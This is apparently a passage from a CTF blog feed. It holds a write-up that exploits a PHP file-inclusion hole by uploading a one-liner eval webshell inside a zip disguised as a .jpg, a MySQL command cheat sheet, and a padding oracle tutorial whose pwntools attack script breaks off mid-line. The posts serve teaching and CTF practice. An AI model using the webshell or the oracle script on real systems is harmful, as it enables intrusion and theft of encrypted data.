</div><div class="line">&lt;?php</div><div class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</div><div class="line">include &apos;config.php&apos;;</div><div class="line">if (isset($_GET[&apos;page&apos;])) &#123;</div><div class="line">    $page = $_GET[&apos;page&apos;];</div><div class="line"></div><div class="line">&#125; else &#123;</div><div class="line">    $page = &quot;home&quot;;</div><div class="line">&#125;</div><div class="line">$file =   $page . &quot;.php&quot;;</div><div class="line"></div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">    &lt;head&gt;</div><div class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</div><div class="line">        &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</div><div class="line">        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</div><div class="line"></div><div class="line">        &lt;title&gt;My PHP Website&lt;/title&gt;</div><div class="line"></div><div class="line">        &lt;link rel=&quot;stylesheet&quot; href=&quot;http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css&quot; /&gt;</div><div class="line">    &lt;/head&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">        &lt;nav class=&quot;navbar navbar-inverse navbar-fixed-top&quot;&gt;</div><div class="line">            &lt;div class=&quot;container&quot;&gt;</div><div class="line">                &lt;div class=&quot;navbar-header&quot;&gt;</div><div class="line">                    &lt;button type=&quot;button&quot; class=&quot;navbar-toggle collapsed&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbar&quot; aria-expanded=&quot;false&quot; aria-controls=&quot;navbar&quot;&gt;</div><div class="line">                        &lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt;</div><div class="line">                        &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</div><div class="line">                        &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</div><div class="line">                        &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</div><div class="line">                    &lt;/button&gt;</div><div class="line">                    &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Project name&lt;/a&gt;</div><div class="line">                &lt;/div&gt;</div><div class="line">                &lt;div id=&quot;navbar&quot; class=&quot;collapse navbar-collapse&quot;&gt;</div><div class="line">                    &lt;ul class=&quot;nav navbar-nav&quot;&gt;</div><div class="line">                        &lt;li &lt;?php if ($page == &quot;home&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;</div><div class="line">                        &lt;li &lt;?php if ($page == &quot;submit&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=submit&quot;&gt;Submit&lt;/a&gt;&lt;/li&gt;</div><div class="line">                        &lt;li &lt;?php if ($page == &quot;about&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?page=about&quot;&gt;About&lt;/a&gt;&lt;/li&gt;</div><div class="line">                    &lt;/ul&gt;</div><div class="line">                &lt;/div&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">        &lt;/nav&gt;</div><div class="line"></div><div class="line">        &lt;div class=&quot;container&quot; style=&quot;margin-top: 50px&quot;&gt;</div><div class="line">            &lt;?php</div><div class="line">                include($file);</div><div class="line">                echo $page;</div><div class="line">                echo &quot;||&quot;;</div><div class="line">                echo $file;</div><div class="line">            ?&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;script src=&quot;http://code.jquery.com/jquery-latest.js&quot; /&gt;</div><div class="line">        &lt;script src=&quot;http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js&quot; /&gt;</div><div class="line">    &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p><p>可以发现<code>index.php</code>中会将<code>?page</code>参数加上’.php’，然后去包含。然后<code>upload.php</code>，会判断上传的文件的后缀是否为’.jpg’或者’.gif’或者’.png’，如果后缀不对，则会显示上传失败；如果后缀正确，则会在<strong>./Err0r</strong>目录下生成一个文件，文件名为随机生成的十六字节的字符串+’.jpg’，更何况提示也说了有个<code>a.php</code>，我们可以看到<code>phpinfo</code>信息，这个版本的php已经修复了<strong>%00</strong>漏洞，所以在文件名上动手脚什么的已经不太行了。</p><p>这里就需要另外的伪协议了，如<code>zip</code>和<code>phar</code>。<br>我们可以利用这两个伪协议来读取压缩包中的文件，具体说明如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[http://php.net/manual/zh/book.phar.php](http://php.net/manual/zh/book.phar.php)</div><div class="line">[http://php.net/manual/zh/book.zip.php](http://php.net/manual/zh/book.zip.php)</div></pre></td></tr></table></figure></p><p>具体解题如下：</p><ol><li>先写一个php一句话木马，文件名为<code>a.php</code>，内容为<code>&#39;&lt;?php eval($_POST[&quot;aaa&quot;]); ?&gt;&#39;</code></li><li>压缩一下变成<code>a.zip</code>，再更改文件名，将原来的<code>a.zip</code>改为<code>a.jpg</code></li><li>上传<code>a.jpg</code>，通过<code>upload.php</code>的上传验证。</li></ol><p>页面返回文件变换之后保存的路径以及文件名，用以下两个方法去包含<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://10.21.13.152:20050/?page=zip://./Err0r/RiiwLkgTlLxPRPsE.jpg%23a</div><div class="line">post:aaa=phpinfo();</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://10.21.13.152:20050/?page=phar://./Err0r/RiiwLkgTlLxPRPsE.jpg/a</div><div class="line">post:aaa=phpinfo();</div></pre></td></tr></table></figure><p>然后菜刀连一下。<br><img src="https://i.imgur.com/le9kFIE.png" alt=""></p><p>然后随便翻翻目录就能找到flag<br><img src="https://i.imgur.com/pSB48Lu.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;周末出题老表伤透了心，原本高高兴兴的打算直接用做出来的童鞋的wp，结果发现没人做，还是得自己写…&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://Err0rzz.github.io/tags/ctf/"/>
    
      <category term="writeup" scheme="http://Err0rzz.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>linux下的mysql使用</title>
    <link href="http://Err0rzz.github.io/2017/11/26/linux%E4%B8%8B%E7%9A%84mysql%E4%BD%BF%E7%94%A8/"/>
    <id>http://Err0rzz.github.io/2017/11/26/linux下的mysql使用/</id>
    <published>2017-11-26T11:18:13.000Z</published>
    <updated>2018-03-09T10:17:26.364Z</updated>
    
    <content type="html"><![CDATA[<p>最近在用docker搭题目，需要使用到mysql，以前在windows下都是用可视化界面，现在用命令行有点不习惯，记录下命令吧。</p><a id="more"></a><p><strong>启动mysql：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">service mysql start</div><div class="line">mysql -u root -p password</div></pre></td></tr></table></figure></p><p><strong>退出mysql</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;exit</div></pre></td></tr></table></figure></p><p><strong>修改密码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt;update mysql.user set password=password(&apos;test&apos;) where username=&apos;root&apos;;</div><div class="line">mysql&gt; flush privileges;</div></pre></td></tr></table></figure></p><p>这里记得刷新权限，不然会失败(一开始老是忘了加flush，死活不成功)。</p><p><strong>建数据库</strong><br>创建数据库名为mysql的数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;create database mysql;</div></pre></td></tr></table></figure></p><p><strong>删除数据库</strong><br>删除数据库名为mysql的数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;drop database mysql;</div></pre></td></tr></table></figure></p><p><strong>进入数据库</strong><br>进入数据库名为mysql的数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;use mysql;</div></pre></td></tr></table></figure></p><p><strong>查看所有数据库</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;show databases;</div></pre></td></tr></table></figure></p><p><strong>创建数据表</strong><br>创建表名为users的数据表,字段分别为id(int),username(varchar(20)),password(varchar(50))，主键为id且自增<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;create table users(id int auto_increment,username varchar(20),password varchar(50),primary key(id));</div></pre></td></tr></table></figure></p><p><strong>查看所有表</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;show tables;</div></pre></td></tr></table></figure></p><p><strong>查看某个表</strong><br>查看数据表名users的所有列<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;desc users;</div></pre></td></tr></table></figure></p><p><strong>修改表名</strong><br>修改原users名为bbb<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;alter table users rename to bbb;</div></pre></td></tr></table></figure></p><p><strong>修改表的列</strong><br>添加列age(int)：<br><code>mysql&gt;alter table users add column age int;</code></p><p>删除列age：<br><code>mysql&gt;alert table users drop column age</code></p><p>修改列属性：<br><code>mysql&gt; alter table users modify age char(10);</code></p><p>删除id自增长：<br><code>mysql&gt;alter table users change id id int;</code></p><p>删除主键：<br><code>mysql&gt; alter table users drop primary key;</code></p><p>修改字段age为不为空：<br><code>mysql&gt; alter table users change age age not null;</code></p><p>添加id为主键，自增长：<br><code>mysql&gt; alter table users modify id int auto_increment primary key ;</code></p><p>设置id默认为0<br><code>mysql&gt; alter table users modify id int default 0 ;</code></p><p><strong>插入数据</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;insert into users (username,password) values(&quot;zz&quot;,&quot;zz_is_handsome&quot;);</div></pre></td></tr></table></figure></p><p><strong>删除数据</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;delete from users where username=&apos;zz&apos;;</div></pre></td></tr></table></figure></p><p><strong>修改数据</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; update users set username=&apos;ZZ&apos; where id=0;</div></pre></td></tr></table></figure></p><p><strong>创建用户</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt;create user zz identified by &quot;root&quot;;</div></pre></td></tr></table></figure></p><p><strong>删除用户</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; drop user zz;</div></pre></td></tr></table></figure></p><p><strong>查看权限</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; show grants for zz;</div></pre></td></tr></table></figure></p><p><strong>赋予权限</strong><br>grant和revoke可以在几个层次上控制访问权限<br>1，整个服务器，使用 grant ALL  和revoke  ALL<br>2，整个数据库，使用on  database.*<br>3，特点表，使用on  database.table<br>4，特定的列<br>5，特定的存储过程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; grant select on sql1.* to zz;</div></pre></td></tr></table></figure></p><p><strong>回收权限</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; revoke  select on sql1.*  from  zz;</div></pre></td></tr></table></figure></p><p><strong>导入数据库</strong><br>方法一：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">选择数据库 </div><div class="line">mysql&gt;use abc;</div><div class="line">设置数据库编码 </div><div class="line">mysql&gt;set names utf8;</div><div class="line">导入数据（注意sql文件的路径） </div><div class="line">mysql&gt;source /home/abc/abc.sql;</div></pre></td></tr></table></figure></p><p>方法二：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">格式：mysql -u用户名 -p密码 数据库名 &lt; 数据库名.sql </div><div class="line">举例：mysql -uabc_f -p abc &lt; abc.sql</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在用docker搭题目，需要使用到mysql，以前在windows下都是用可视化界面，现在用命令行有点不习惯，记录下命令吧。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Padding_Oracle 攻击</title>
    <link href="http://Err0rzz.github.io/2017/11/23/Padding-Oracle-%E6%94%BB%E5%87%BB/"/>
    <id>http://Err0rzz.github.io/2017/11/23/Padding-Oracle-攻击/</id>
    <published>2017-11-23T05:52:35.000Z</published>
    <updated>2017-11-23T12:42:28.445Z</updated>
    
    <content type="html"><![CDATA[<p>道哥的《白帽子讲web安全》有一章提到Padding Oracle Attack的攻击方式，据说这货在2011年的Pwnie Rewards上还被评为”最具价值的服务器漏洞”。而且比赛中经常遇到，而且一般都是混在<code>web</code>题里的<code>crypto</code>。</p><a id="more"></a><p><code>PS：ms10-070</code></p><p>适用于<strong>CBC</strong>模式下的<code>AES</code>，<code>DES</code>，<code>3DES</code>等分组密码</p><p>攻击成立的条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1. 攻击者能够获得密文（Ciphertext），以及附带在密文前面的IV（初始化向量）</div><div class="line">2. 攻击者能够触发密文的解密过程，且能够知道密文的解密结果</div></pre></td></tr></table></figure></p><p><br></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>尽量去看《白帽子讲web安全》，网上有些讲解原理有些问题，我看了半天才发现，而且后来虽然看懂了，但是代码实现又有些难度，就结合一些题目的wp中别人的代码去理解，然后自己实现一遍之后发现对原理理解更加深刻。</p><h1 id="分组的填充-Padding"><a href="#分组的填充-Padding" class="headerlink" title="分组的填充(Padding)"></a>分组的填充(Padding)</h1><p>分组密码Block Cipher需要在加载前确保每个每组的长度都是分组长度的整数倍。一般情况下，明文的最后一个分组很有可能会出现长度不足分组的长度:<br><img src="https://i.imgur.com/oFrfAaJ.png" alt=""></p><p>这个时候，普遍的做法是在最后一个分组后填充一个固定的值，这个值的大小为填充的字节总数。即假如最后还差3个字符，则填充0×03。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">1个字节的Padding为0x01</div><div class="line">2个字节的Padding为0x02</div><div class="line">3个字节的Padding为0x03</div><div class="line">4个字节的Padding为0x04</div><div class="line">5个字节的Padding为0x05</div><div class="line">6个字节的Padding为0x06</div><div class="line">7个字节的Padding为0x07</div><div class="line">8个字节的Padding为0x08(当原始的明文正好是分组的整数倍的时候，Padding一个整组的填充值)</div></pre></td></tr></table></figure><p>just like:<br><img src="https://i.imgur.com/tEDJE9a.png" alt=""><br>这种Padding原则遵循的是常见的PKCS#5标准</p><p><strong>cbc(Cipher Block Chaining CBC)</strong>模式下加解密：<br><img src="https://i.imgur.com/DYj0ER5.png" alt=""><br><img src="https://i.imgur.com/hjOCP8v.png" alt=""></p><p>这里要注意，前几个分组的解密结果对我们都没有意义，我们重点关注的是最后一个分组的解密结果。看这张图可能会清楚一点:<br><img src="https://i.imgur.com/kTMKZtS.png" alt=""><br><br></p><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>在<strong>Padding Oracle Attack</strong>攻击中，攻击者输入的参数是<code>IV+Cipher</code>，我们要通过对IV的”穷举”来请求服务器端对我们指定的Cipher进行解密，并对返回的结果进行判断。 </p><p>当提交参数时，服务端的返回结果会有下面3种情况：</p><ul><li>参数是一串正确的密文，分组、填充、加密都是对的(程序运行本身没出问题)，包含的内容也是正确的(业务逻辑是对的)，那么服务端解密、检测用户权限都没有问题，返回HTTP 200。</li><li>参数是一串错误的密文，包含不正确的bit填充(程序运行本身出现致命错误)，那么服务端解密时就会抛出异常，返回HTTP 500 server error。</li><li>参数是一串正确的密文(程序运行本身没出问题)，包含的用户名是错误的(业务逻辑是错的)，那么服务端解密之后检测权限不通过，但是依旧会返回HTTP 200戒者HTTP 302，而不是HTTP 500。 </li></ul><p>因此慢慢调整IV的值，以此希望解密后，最后一个字节的值为正确的<strong>padding byte</strong>，比如一个0x01。<br><br></p><h1 id="破解密文得到明文"><a href="#破解密文得到明文" class="headerlink" title="破解密文得到明文"></a>破解密文得到明文</h1><p><strong>先爆破出最后字节</strong>：<br>因为<code>Intermediray Value</code>是固定不变的，所以我们可以通过遍历<code>Initialization Vector</code>的最后一个字节(从0x00带0xFF)，有且只有一个的值与<code>Intermediray Value</code>进行XOR后结果是0x01。通过遍历这255个值，我们得到了那个我们所需的IV，<strong>此时解密系统返回的是一个乱码，而不是解密失败，可以根据返回值来确定那个IV。</strong><br><code>PS：下面这图就是我开始说的网上有问题的地方，黄色应该是0x3c,蓝色的地方应该是0x3d,可以参考书本</code><br><img src="https://i.imgur.com/ReYlu4x.png" alt=""><br>然后将我们现在得到的<code>IV</code>与目前填充的值通过XOR运算，我们可以算出<code>Intermediray Value</code>的最后一个字节，根据解密过程，将这个字节和真实的IV最后一个字节XOR，则是明文的最后一个字节~~<br><img src="https://i.imgur.com/slMWJfU.png" alt=""></p><p><strong>爆破倒数第二个字节</strong>：<br>在正确匹配了padding “0x01”后，需要做的是继续推导出剩下的<code>Intermediary Byte</code>。根据padding标准，当需要padding两个字节的时候，其值应该为<strong>0x02,0x02</strong>。而此时我们知道了<code>Intermediary Byte</code>为0x3d，因此我们可以先更新IV的最后一个字节为<strong>0x3d^0x02=0x3f</strong>(这样等会做XOR的时候，最后一位肯定一直为0x02,我们就只需要关注倒数第二位即可)，此时可以开始遍历IV倒数第二个字节了(0x00-0xFF),跟前面步骤一样。</p><p>接下来依次类推，就可以推导出所有<code>Intermediary Byte</code>，我们这时候就完成了不需要密钥来解密爆破得到了明文。<br><br></p><h1 id="构造任意明文对应的密文"><a href="#构造任意明文对应的密文" class="headerlink" title="构造任意明文对应的密文"></a>构造任意明文对应的密文</h1><p>根据上面的解法，我们可以得到<code>Intermediary Value</code>，而在这个前提下，而且我们可以控制IV，所以我们可以通过改变IV来使得XOR的结果为任意明文，还是观察这张图：<br><img src="https://i.imgur.com/SIUNy2R.png" alt=""></p><p>对于多个分组的密文来说，从最后一组密文开始往前推。以两个分组为例，当我们推出第二个分组的IV(我们通过改变IV来改变解密出来的明文)，而此时这个IV是第一个分组的密文，所以我们需要将这个IV作为第一个分组的密文再进行推导。<br><br></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>虽然上面的原理理解起来不难，但是具体情境中代码实现起来还是挺难的，所以还是用例题来详细说明吧</p><h1 id="is-aes-secure"><a href="#is-aes-secure" class="headerlink" title="is_aes_secure"></a>is_aes_secure</h1><p>题目是第三届上海市网络安全大赛的题目，题目源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/ruby -w</div><div class="line">require &apos;openssl&apos;</div><div class="line">require &apos;base64&apos;</div><div class="line"></div><div class="line">def banner()</div><div class="line">    puts &apos; ____________________________________________&apos;</div><div class="line">    puts &apos;|                                            |&apos;</div><div class="line">    puts &apos;| Welcome to our secure communication system |&apos;</div><div class="line">    puts &apos;| Our system is secured by AES               |&apos;    </div><div class="line">    puts &apos;| So...No key! No Message!                   |&apos;</div><div class="line">    puts &apos;|____________________________________________|&apos;</div><div class="line">    puts &apos;&apos;</div><div class="line">end</div><div class="line"></div><div class="line">def option()</div><div class="line">    puts &apos;1. Get the secret message.&apos;</div><div class="line">    puts &apos;2. Encrypt the message&apos;</div><div class="line">    puts &apos;3. Decrypt the message.&apos;</div><div class="line">    puts &apos;Give your option:&apos;</div><div class="line">    STDOUT.flush</div><div class="line">    op=gets</div><div class="line">    return op.to_i</div><div class="line">end</div><div class="line"></div><div class="line">def init()</div><div class="line">    file_key=File.new(&quot;./aeskey&quot;,&quot;r&quot;)</div><div class="line">    $key=file_key.gets</div><div class="line">    file_key.close()</div><div class="line">end</div><div class="line">def aes_encrypt(iv,data)</div><div class="line">    cipher = OpenSSL::Cipher::AES.new(256, :CBC)</div><div class="line">    cipher.encrypt</div><div class="line">    cipher.key = $key</div><div class="line">    cipher.iv  = iv</div><div class="line">    cipher.update(data) &lt;&lt; cipher.final</div><div class="line">end</div><div class="line"></div><div class="line">def aes_decrypt(iv,data)</div><div class="line">    cipher = OpenSSL::Cipher::AES.new(256, :CBC)</div><div class="line">    cipher.decrypt</div><div class="line">    cipher.key = $key</div><div class="line">    cipher.iv  = iv</div><div class="line">    data = cipher.update(data) &lt;&lt; cipher.final</div><div class="line">end</div><div class="line"></div><div class="line">def output_secret()</div><div class="line">    file_secret=File.new(&quot;./flag&quot;,&quot;r&quot;)</div><div class="line">    secret=file_secret.gets</div><div class="line">    file_secret.close</div><div class="line">    secret_enc=aes_encrypt(&quot;A&quot;*16,secret)</div><div class="line">    secret_enc_b64=Base64.encode64(secret_enc)</div><div class="line">    puts secret_enc_b64 </div><div class="line">end</div><div class="line"></div><div class="line">init</div><div class="line">banner</div><div class="line">while true do</div><div class="line">    begin</div><div class="line">        op=option</div><div class="line">        if op==1</div><div class="line">            output_secret</div><div class="line">        elsif op==2</div><div class="line">            puts &quot;IV:&quot;</div><div class="line">            STDOUT.flush</div><div class="line">            iv=Base64.decode64(gets)</div><div class="line">            puts &quot;Data:&quot;</div><div class="line">            STDOUT.flush</div><div class="line">            data=Base64.decode64(gets)</div><div class="line">            data_enc=aes_encrypt iv,data</div><div class="line">            puts Base64.encode64(data_enc)</div><div class="line">            puts &quot;Encrytion Done&quot;    </div><div class="line">            STDOUT.flush</div><div class="line">        elsif op==3</div><div class="line">            puts &quot;IV:&quot;</div><div class="line">            STDOUT.flush</div><div class="line">            iv=Base64.decode64(gets)</div><div class="line">            puts &quot;Data:&quot;</div><div class="line">            STDOUT.flush</div><div class="line">            data=Base64.decode64(gets)</div><div class="line">            data_dec=aes_decrypt iv,data</div><div class="line">            puts &quot;Decrpytion Done&quot;</div><div class="line">            STDOUT.flush</div><div class="line">        else</div><div class="line">            puts &apos;Wrong Option&apos;</div><div class="line">            STDOUT.flush</div><div class="line">        end</div><div class="line">    rescue Exception =&gt; e  </div><div class="line">        puts e.message</div><div class="line">        STDOUT.flush</div><div class="line">        retry</div><div class="line">    end</div><div class="line">end</div></pre></td></tr></table></figure></p><p>这个题是<code>aes</code>的<code>cbc 256bit</code>加密方式，从给出的脚本可以看出，我们可以得到flag的密文，而且我们可以通过操作3得知我们输入的iv和密文是否符合格式，所以，可以使用<strong>padding oracle attack</strong>。这个密文长48个字节，所以，这是分成3块的cbc加密，第一块密文原本使用原来的iv: <code>AAAAAAAAAAAAAAAA</code>作为iv来进行解密，第二块它使用第一块密文来进行解密，第三块使用第二块密文进行解密。这个加密过程，我们要不断更换iv，因为我们知道cbc模式是密文使用key进行加密得到一个中间值，中间值与iv逐位异或得到明文。根据padding的原理，我们只要一位一位进行爆破，求出中间值就好。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"># coding=utf-8</div><div class="line">from pwn import *</div><div class="line"></div><div class="line">Cipher_Text = &apos;s\xf8\x804*S=\x06\x9b=,3\xea,E*\xaa\xc1\xcd\xf6\xcc\xb8\x1eQ\xf0\x81\xa9\x0e\xa4\x11\xfe\x9e\xdb\xd6\xbfm\xe7\xba\xb5\x02\xda\xbd\xb9\xc5\x1b\x7f\xb4\x90&apos;</div><div class="line">block1 = Cipher_Text[:16]</div><div class="line">block2 = Cipher_Text[16:32]</div><div class="line">block3 = Cipher_Text[32:]</div><div class="line">Origin_IV = &apos;A&apos;*16</div><div class="line">#Origin_IV = block1</div><div class="line">#Origin_IV = block2</div><div class="line"></div><div class="line">p = remote(&apos;106.75.98.74&apos;,10010)</div><div class="line"></div><div class="line">def Padding_Oracle_Attack(New_IV):</div><div class="line">    p.recvuntil(&apos;option:\n&apos;)</div><div class="line">    p.send(&apos;3\n&apos;)</div><div class="line">    p.recvuntil(&apos;IV:\n&apos;)</div><div class="line">    p.send(New_IV)</div><div class="line">    p.recvuntil(&quot;Data:\n&quot;)</div><div class="line">    p.send(block1.encode(&apos;base64&apos;))</div><div class="line">    response = p.recvline()</div><div class="line">    print response</div><div class="line">    if &quot;Decrpytion Done&quot; in response:</div><div class="line">        print &apos;find true iv byte&apos;</div><div class="line">        print New_IV</div><div class="line">        return 1</div><div class="line">    else:</div><div class="line">        print &apos;false&apos;</div><div class="line"></div><div class="line">Clear_Text = &apos;&apos;</div><div class="line">Known_Byte_IV = &apos;&apos;</div><div class="line">Known_Byte_Intermediary = &apos;&apos;</div><div class="line"></div><div class="line">#因为AES分组长度为16，所以Padding可以达到0x0f，而不是像DES的0x08</div><div class="line">for Now_Padding in xrange(1,17):</div><div class="line">    #将已知的Intermediary Byte与当前需要构造的填充进行XOR,来构造出后面几位的IV</div><div class="line">    for byte in Known_Byte_Intermediary:</div><div class="line">        Known_Byte_IV += chr(ord(byte)^Now_Padding) </div><div class="line"></div><div class="line">    #开始遍历0x00-0xFF</div><div class="line">    for i in xrange(0,256):</div><div class="line">        #未知的Intermediary Byte所对应的IV用&apos;0&apos;来补齐</div><div class="line">        Unknown_Byte_IV = (15-len(Known_Byte_Intermediary)) * chr(0)</div><div class="line">        New_IV = Unknown_Byte_IV +chr(i)+Known_Byte_IV</div><div class="line"></div><div class="line">        if Padding_Oracle_Attack(New_IV.encode(&apos;base64&apos;)):</div><div class="line">            Now_Byte_Intermediary = chr(i^Now_Padding)</div><div class="line">            Known_Byte_Intermediary = Now_Byte_Intermediary+Known_Byte_Intermediary</div><div class="line"></div><div class="line">            Clear_Text_Byte = chr(Now_Byte_Intermediary^ord(Origin_IV[16-Now_Padding]))</div><div class="line">            Clear_Text = 